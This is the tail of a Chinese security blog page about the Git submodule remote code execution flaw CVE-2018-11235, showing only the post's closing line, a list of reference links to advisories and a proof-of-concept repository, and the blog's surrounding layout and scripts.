<p>有些地方可能没解释清楚或有不当的地方，欢迎留言讨论。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://github.com/Rogdham/CVE-2018-11235" target="_blank" rel="external">Rogdham/CVE-2018-11235</a></li>
<li><a href="https://blogs.msdn.microsoft.com/devops/2018/05/29/announcing-the-may-2018-git-security-vulnerability/" target="_blank" rel="external">Remediating the May 2018 Git Security Vulnerability</a></li>
<li><a href="https://git-scm.com/book/zh/v2/Git-%E5%B7%A5%E5%85%B7-%E5%AD%90%E6%A8%A1%E5%9D%97" target="_blank" rel="external">Git 工具 - 子模块</a></li>
<li><a href="https://blog.github.com/2014-12-18-vulnerability-announced-update-your-git-clients/" target="_blank" rel="external">CVE-2014–9390</a></li>
<li><a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="external">atorralba：CVE-2018-11235 - Quick &amp; Dirty PoC</a></li>
</ul>

      
  </div>
    <div>
      
        <!-- Google AdSense start -->
        <!-- test3 -->
<ins class="adsbygoogle2"
     style="display:block"
     data-ad-client="ca-pub-3467872413268634"
     data-ad-slot="2179835194"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle2 = window.adsbygoogle2 || []).push({});
</script>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- test -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3467872413268634"
     data-ad-slot="5815348948"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
        <!-- Google AdSense end -->
      
    </div>

    <div>
      
        
  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
    <div>点击赞赏二维码，您的支持将鼓励我继续创作！</div>
    <div id="QR" style="display: block;">
      
        <div id="wechat" style="display: inline-block">
          <img id="wechat_qr" src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/wechat.png" alt="chybeta WeChat Pay"/>
          <p>微信打赏</p>
        </div>
      
      
        <div id="alipay" style="display: inline-block">
          <img id="alipay_qr" src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/alipay.jpg?raw=true" alt="chybeta Alipay"/>
          <p>支付宝打赏</p>
        </div>
      
    </div>
  </div>


      
    </div>
	<div>
      
        
<div class="my_post_copyright">
  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
  <!-- JS库 sweetalert 可修改路径 -->
  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
  <p><span>本文标题:</span><a href="/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/">RCE with Git submodule分析-【CVE-2018-11235】</a></p>
  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
  <p><span>发布时间:</span>2018年05月31日 - 16:05</p>
  <p><span>最后更新:</span>2018年07月05日 - 08:07</p>
  <p><span>原始链接:</span><a href="/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/" title="RCE with Git submodule分析-【CVE-2018-11235】">http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/</a>
    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/"  aria-label="复制成功！"></i></span>
  </p>
  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
</div>
<script>
    var clipboard = new Clipboard('.fa-clipboard');
    clipboard.on('success', $(function(){
      $(".fa-clipboard").click(function(){
        swal({
          title: "",
          text: '复制成功',
          html: false,
          timer: 500,
          showConfirmButton: false
        });
      });
    }));
</script>


      
	</div>
    <div>
      
        

      
    </div>



    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/命令执行/" rel="tag"># 命令执行</a>
          
            <a href="/tags/git/" rel="tag"># git</a>
          
            <a href="/tags/submodule/" rel="tag"># submodule</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/05/14/Unsafe-Unzip-with-spring-integration-zip-分析-【CVE-2018-1261-与-CVE-2018-1263】/" rel="next" title="Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】">
                <i class="fa fa-chevron-left"></i> Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/07/16/Apache-Solr-XXE漏洞分析-【CVE-2018-8026】/" rel="prev" title="Apache Solr XXE漏洞分析 -【CVE-2018-8026】">
                Apache Solr XXE漏洞分析 -【CVE-2018-8026】 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      

          </div>
          


          
  <div class="comments" id="comments">
    
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTAzNC81NjAz"></div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="chybeta" />
          <p class="site-author-name" itemprop="name">chybeta</p>
          <p class="site-description motion-element" itemprop="description"></p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">195</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">13</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">115</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/CHYbeta" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/chybeta" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                  Twitter
                </a>
              </span>
            
          
        </div>

        
        

        
        
          <div class="links-of-blogroll motion-element links-of-blogroll-block">
            <div class="links-of-blogroll-title">
              <i class="fa  fa-fw fa-globe"></i>
              Links
            </div>
            <ul class="links-of-blogroll-list">
              
                <li class="links-of-blogroll-item">
                  <a href="https://ph0en1x.com/" title="XMU-Ph0en1x" target="_blank">XMU-Ph0en1x</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://www.lzhtony.com/" title="lzhtony" target="_blank">lzhtony</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://findneo.github.io/" title="findneo" target="_blank">findneo</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://madsome.one/" title="Mads" target="_blank">Mads</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://ginove.github.io/" title="Ginove" target="_blank">Ginove</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://cltheorem.github.io/" title="cltheorem" target="_blank">cltheorem</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://www.cnblogs.com/frankscode/" title="Frank" target="_blank">Frank</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://philhe.coding.me/" title="Philhe" target="_blank">Philhe</a>
                </li>
              
            </ul>
          </div>
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞公告"><span class="nav-number">1.</span> <span class="nav-text">漏洞公告</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞复现"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补丁浅析"><span class="nav-number">4.</span> <span class="nav-text">补丁浅析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">chybeta</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  
      <!-- UY BEGIN -->
      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
      <!-- UY END -->
  




  
    <script type="text/javascript">
      (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
        if (typeof LivereTower === 'function') { return; }
        j = d.createElement(s);
        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
        j.async = true;
        e.parentNode.insertBefore(j, e);
      })(document, 'script');
    </script>
  



  
  
  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length == 0) {
      search_path = "search.xml";
    }
    var path = "/" + search_path;
    // monitor main search box;

    function proceedsearch() {
      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
      $('.popup').toggle();
    }
    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';
      $.ajax({
        url: path,
        dataType: "xml",
        async: true,
        success: function( xmlResponse ) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = $( "entry", xmlResponse ).map(function() {
            return {
              title: $( "title", this ).text(),
              content: $("content",this).text(),
              url: $( "url" , this).text()
            };
          }).get();
          var $input = document.getElementById(search_id);
          var $resultContent = document.getElementById(content_id);
          $input.addEventListener('input', function(){
            var matchcounts = 0;
            var str='<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length > 1) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var content_index = [];
                var data_title = data.title.trim().toLowerCase();
                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
                var data_url = decodeURIComponent(data.url);
                var index_title = -1;
                var index_content = -1;
                var first_occur = -1;
                // only match artiles with not empty titles and contents
                if(data_title != '') {
                  keywords.forEach(function(keyword, i) {
                    index_title = data_title.indexOf(keyword);
                    index_content = data_content.indexOf(keyword);
                    if( index_title >= 0 || index_content >= 0 ){
                      isMatch = true;
                      if (i == 0) {
                        first_occur = index_content;
                      }
                    }

                  });
                }
                // show search results
                if (isMatch) {
                  matchcounts += 1;
                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
                  var content = data.content.trim().replace(/<[^>]+>/g,"");
                  if (first_occur >= 0) {
                    // cut out 100 characters
                    var start = first_occur - 20;
                    var end = first_occur + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if(start == 0){
                      end = 50;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    var match_content = content.substring(start, end);
                    // highlight all keywords
                    keywords.forEach(function(keyword){
                      var regS = new RegExp(keyword, "gi");
                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
                    });

                    str += "<p class=\"search-result\">" + match_content +"...</p>"
                  }
                  str += "</li>";
                }
              })};
            str += "</ul>";
            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
            $resultContent.innerHTML = str;
          });
          proceedsearch();
        }
      });}

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched == false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(function(e){
      $('.popup').hide();
      $(".popoverlay").remove();
      $('body').css('overflow', '');
    });
    $('.popup').click(function(e){
      e.stopPropagation();
    });
  </script>


  
  


  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>AV.initialize("unqDDYqYUADBUogKkMVqqvFH-gzGzoHsz", "afr1xO80LoKo0xCpxHJCleC4");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  <script type='text/javascript' color='252,3,184' zIndex='-1' opacity='20' count='99' src='//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js'></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
</body>
</html>
